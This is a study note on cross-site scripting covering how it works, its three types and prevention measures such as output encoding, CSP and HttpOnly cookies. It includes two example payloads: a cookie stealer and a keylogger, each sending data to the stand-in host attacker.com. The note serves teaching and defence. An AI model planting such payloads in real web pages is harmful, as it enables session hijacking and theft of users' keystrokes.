# XSS (Cross-Site Scripting)

Source: https://app.notion.com/p/2b8fc75cbbd980cfa623d9fa5c422c52?pvs=204

<b>Cross-Site Scripting</b> - Called "XSS" instead of "CSS" to avoid confusion with Cascading Style Sheets

XSS is a vulnerability where attackers inject malicious scripts into web pages that other users will view. The victim's browser executes the malicious script, thinking it's legitimate code from the trusted website.

- Attacker finds an input field that doesn't properly sanitize data
- Injects malicious JavaScript code
- Code gets stored/reflected on the webpage
- When other users visit, their browsers execute the malicious script
- Attacker can steal cookies, session tokens, keystrokes, or perform actions as the user

## Types of XSS

- <b>Stored XSS</b>: Malicious script permanently stored on target server (databases, forums, comment fields)
- <b>Reflected XSS</b>: Script reflected off web server (error messages, search results)
- <b>DOM-based XSS</b>: Vulnerability exists in client-side code rather than server-side

1. <b>Session Hijacking:</b>

```javascript
<script>
// Steals user's session cookie and sends to attacker
var img = new Image();
img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

<code>document.cookie</code> returns all cookies accessible to JavaScript on that domain.

If the session cookie is <b>not </b>marked <code>HttpOnly</code>  js can read it.

2. Keylogger:

```java
<script>
// Captures all keystrokes and sends to attacker
var keys = "";
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.which);
    if(keys.length > 10) {
        new Image().src = "http://attacker.com/log.php?keys=" + keys;
        keys = "";
    }
}
</script>
```

Does XSS require the user to click on a link? No

## <b>Prevention</b>

<b>Input Validation</b>

Check all incoming data and allow only known-safe patterns (whitelisting).

Example: Only allow letters/numbers in a username. This stops malicious scripts from ever entering the system.

<b>Output Encoding</b>

Before displaying user-provided data in HTML, convert special characters to safe encoded versions.

Example: <code><</code> becomes <code>&lt;</code>.

Encoded text cannot run as JavaScript, so injected scripts display as text instead of executing.

<b>Content Security Policy (CSP)</b>

A security header that tells the browser which script sources are allowed.

Example: Only allow scripts from your own domain.

Even if an attacker injects script code, the browser refuses to execute it unless it matches the allowed sources.

<b>Use Framework Functions</b>

Use built-in escaping/sanitizing functions instead of handling strings manually.

Examples: <code>htmlspecialchars()</code> in PHP, using <code>textContent</code> instead of <code>innerHTML</code> in JS.

These automatically neutralize dangerous characters that could form XSS payloads.

<b>HttpOnly Cookies</b>

Mark session cookies as <code>HttpOnly</code> so JavaScript cannot read them.

Even if an attacker injects JavaScript, <code>document.cookie</code> won’t return the session cookie, preventing theft.
